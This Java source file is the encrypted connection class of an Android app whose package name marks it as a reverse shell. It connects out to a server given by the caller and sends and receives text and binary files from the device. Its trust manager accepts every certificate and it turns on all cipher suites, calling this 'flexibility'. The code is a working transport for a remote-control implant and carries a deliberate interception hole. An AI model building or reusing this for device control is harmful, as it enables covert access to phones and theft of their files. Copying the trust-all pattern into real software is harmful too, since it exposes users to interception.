package com.example.reverseshell2;

import android.util.Log;
import java.io.*;
import java.net.*;
import java.security.SecureRandom;
import java.security.cert.X509Certificate;
import javax.net.ssl.*;

/**
 * Enhanced secure communication handler with TLS encryption
 * Replaces the old plain TCP connection with modern encrypted communication
 */
public class SecureTcpConnection {
    
    private static final String TAG = "SecureTcpConnection";
    private SSLSocket sslSocket;
    private SSLContext sslContext;
    private BufferedReader in;
    private BufferedWriter out;
    private boolean isConnected = false;
    
    /**
     * Initialize SSL context with custom trust manager for flexibility
     */
    public SecureTcpConnection() {
        try {
            // Create SSL context
            sslContext = SSLContext.getInstance("TLS");
            
            // Create trust manager that accepts all certificates (for flexibility)
            TrustManager[] trustAllCerts = new TrustManager[] {
                new X509TrustManager() {
                    @Override
                    public X509Certificate[] getAcceptedIssuers() {
                        return new X509Certificate[0];
                    }
                    
                    @Override
                    public void checkClientTrusted(X509Certificate[] certs, String authType) {
                        // Accept all client certificates
                    }
                    
                    @Override
                    public void checkServerTrusted(X509Certificate[] certs, String authType) {
                        // Accept all server certificates
                    }
                }
            };
            
            sslContext.init(null, trustAllCerts, new SecureRandom());
            
            Log.d(TAG, "SSL context initialized");
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to initialize SSL context", e);
        }
    }
    
    /**
     * Connect to server with TLS encryption
     */
    public boolean connect(String serverIP, int serverPort) {
        try {
            Log.d(TAG, "Attempting secure connection to " + serverIP + ":" + serverPort);
            
            // Create SSL socket factory
            SSLSocketFactory factory = sslContext.getSocketFactory();
            
            // Create SSL socket
            sslSocket = (SSLSocket) factory.createSocket(serverIP, serverPort);
            
            // Set timeout
            sslSocket.setSoTimeout(30000);
            
            // Enable all supported cipher suites for compatibility
            sslSocket.setEnabledCipherSuites(sslSocket.getSupportedCipherSuites());
            
            // Start TLS handshake
            sslSocket.startHandshake();
            
            // Create input/output streams
            in = new BufferedReader(new InputStreamReader(sslSocket.getInputStream()));
            out = new BufferedWriter(new OutputStreamWriter(sslSocket.getOutputStream()));
            
            isConnected = true;
            Log.d(TAG, "Secure connection established successfully");
            
            return true;
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to establish secure connection", e);
            disconnect();
            return false;
        }
    }
    
    /**
     * Send encrypted message to server
     */
    public boolean sendMessage(String message) {
        if (!isConnected || out == null) {
            Log.w(TAG, "Cannot send message - not connected");
            return false;
        }
        
        try {
            out.write(message);
            out.newLine();
            out.flush();
            
            Log.d(TAG, "Message sent securely: " + message.substring(0, Math.min(50, message.length())));
            return true;
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to send message", e);
            disconnect();
            return false;
        }
    }
    
    /**
     * Receive encrypted message from server
     */
    public String receiveMessage() {
        if (!isConnected || in == null) {
            Log.w(TAG, "Cannot receive message - not connected");
            return null;
        }
        
        try {
            String message = in.readLine();
            if (message != null) {
                Log.d(TAG, "Message received securely: " + message.substring(0, Math.min(50, message.length())));
            }
            return message;
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to receive message", e);
            disconnect();
            return null;
        }
    }
    
    /**
     * Send binary data (files, images, etc.)
     */
    public boolean sendBinaryData(byte[] data) {
        if (!isConnected || sslSocket == null) {
            Log.w(TAG, "Cannot send binary data - not connected");
            return false;
        }
        
        try {
            OutputStream os = sslSocket.getOutputStream();
            
            // Send data length first
            DataOutputStream dos = new DataOutputStream(os);
            dos.writeInt(data.length);
            
            // Send binary data
            os.write(data);
            os.flush();
            
            Log.d(TAG, "Binary data sent securely: " + data.length + " bytes");
            return true;
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to send binary data", e);
            disconnect();
            return false;
        }
    }
    
    /**
     * Receive binary data
     */
    public byte[] receiveBinaryData() {
        if (!isConnected || sslSocket == null) {
            Log.w(TAG, "Cannot receive binary data - not connected");
            return null;
        }
        
        try {
            InputStream is = sslSocket.getInputStream();
            DataInputStream dis = new DataInputStream(is);
            
            // Read data length first
            int dataLength = dis.readInt();
            
            if (dataLength <= 0 || dataLength > 50 * 1024 * 1024) { // Max 50MB
                Log.e(TAG, "Invalid data length: " + dataLength);
                return null;
            }
            
            // Read binary data
            byte[] data = new byte[dataLength];
            dis.readFully(data);
            
            Log.d(TAG, "Binary data received securely: " + data.length + " bytes");
            return data;
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to receive binary data", e);
            disconnect();
            return null;
        }
    }
    
    /**
     * Check if connection is active
     */
    public boolean isConnected() {
        return isConnected && sslSocket != null && sslSocket.isConnected() && !sslSocket.isClosed();
    }
    
    /**
     * Get connection info for debugging
     */
    public String getConnectionInfo() {
        if (sslSocket != null) {
            try {
                SSLSession session = sslSocket.getSession();
                return "Cipher: " + session.getCipherSuite() + 
                       ", Protocol: " + session.getProtocol() +
                       ", Peer: " + session.getPeerHost() + ":" + session.getPeerPort();
            } catch (Exception e) {
                Log.e(TAG, "Error getting connection info", e);
            }
        }
        return "Not connected";
    }
    
    /**
     * Disconnect and cleanup resources
     */
    public void disconnect() {
        isConnected = false;
        
        try {
            if (in != null) {
                in.close();
                in = null;
            }
        } catch (Exception e) {
            Log.e(TAG, "Error closing input stream", e);
        }
        
        try {
            if (out != null) {
                out.close();
                out = null;
            }
        } catch (Exception e) {
            Log.e(TAG, "Error closing output stream", e);
        }
        
        try {
            if (sslSocket != null) {
                sslSocket.close();
                sslSocket = null;
            }
        } catch (Exception e) {
            Log.e(TAG, "Error closing SSL socket", e);
        }
        
        Log.d(TAG, "Secure connection closed");
    }
}